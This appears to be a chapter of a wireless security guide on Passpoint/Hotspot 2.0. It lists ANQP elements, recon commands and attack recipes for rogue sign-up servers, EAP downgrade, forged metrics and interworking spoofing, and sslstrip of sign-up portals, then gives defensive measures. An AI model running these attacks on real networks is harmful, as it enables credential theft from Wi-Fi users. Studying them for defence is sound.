# 11 - Passpoint / Hotspot 2.0 Deep Dive

## Overview

Passpoint (Hotspot 2.0, IEEE 802.11u) enables automatic authentication and roaming across Wi-Fi networks. Used by cellular carriers, enterprise guest access, and municipal Wi-Fi. ANQP (Access Network Query Protocol) elements create new attack surfaces.

## ANQP Elements

| Element ID | Name | Content |
|-----------|------|---------|
| 256 | Query List | Requested IE list |
| 257 | Capability List | Supported IEs |
| 260 | Network Auth Type | Captive portal URL |
| 263 | NAI Realm List | EAP methods per realm |
| 264 | 3GPP Cellular Info | MCC-MNC list |
| 265 | Geospatial Location | Lat/Lon/Altitude |
| 268 | Domain Name List | FQDNs |
| 278 | OSU Providers | Online sign-up servers |
| 282 | WAN Metrics | Link status, load, capacity |

## Reconnaissance: ANQP Query

```bash
# Query ANQP from Passpoint AP
iw dev wlan0 scan | grep -A 20 "Hotspot 2.0"

# Scapy ANQP Request
python3 << 'PY'
from scapy.all import *
pkt = RadioTap()/Dot11(addr1=<BSSID>, addr2=<MY_MAC>, addr3=<BSSID>,
                       type=0, subtype=0x0D)/Dot11Action(category=4)
sendp(pkt, iface='wlan0mon')
PY
```

## Attack 1: Rogue OSU Server

OSU (Online Sign-Up) allows credential provisioning via web portal.

```bash
# Step 1: Extract OSU info from ANQP (Element 278)
# Contains: OSU SSID, Server URI, Method, Icon, NAI

# Step 2: Clone OSU SSID as rogue AP
hostapd /etc/hostapd/osu_rogue.conf

# Step 3: Present fake portal, harvest credentials
# Many use SMS OTP - attacker can relay OTP request
```

## Attack 2: Realm-Based EAP Downgrade

NAI Realm List (263) advertises EAP methods. Force downgrade to weakest.

```bash
# Query realm info
hostapd_cli anqp_get <BSSID> 263

# Create rogue AP advertising ONLY EAP-GTC (plaintext)
# Client falls back from PEAP to GTC, exposing password
```

## Attack 3: WAN Metrics Manipulation

WAN Metrics (282) reports link quality. Spoof metrics to influence client preference.

```bash
# Set WAN metrics in rogue AP: claim zero load, 1 Gbps
wan_metrics=01:00:00:00:00:00:03:e8:00:00:01:86:a0
# Link up, not symmetric, not at capacity, 1000000 kbps down, 100000 kbps up, 10% load
```

## Attack 4: Interworking Spoofing

Forge interworking element to masquerade as trusted network type.

```bash
interworking=1
access_network_type=2  # Chargeable public
internet=1
venue_group=2
venue_type=8
hessid=00:11:22:33:44:55
```

## Attack 5: OSU Method Downgrade

Force HTTP (no TLS) OSU signup by stripping HTTPS redirect.

```bash
# dnsspoof + sslstrip on OSU captive portal
# User credentials transmitted in plaintext
```

## Defensive Application

- **Certificate pinning on OSU servers**: Pre-deploy OSU root CA on managed devices
- **EAP method whitelist**: Allow only EAP-TLS/PEAP-MSCHAPv2, reject GTC
- **ANQP verification**: Cross-check ANQP domain names against known carrier list
- **WAN metrics bounds**: Sanity-check advertised metrics against physical limits
- **OSU HTTPS enforcement**: Reject HTTP OSU URIs
- **Realm validation**: Verify NAI realm matches carrier roaming agreement

## References

- Wi-Fi Alliance Hotspot 2.0 Specification
- IEEE 802.11u-2011 Interworking with External Networks
- IEEE 802.11-2020 Annex E: Interworking
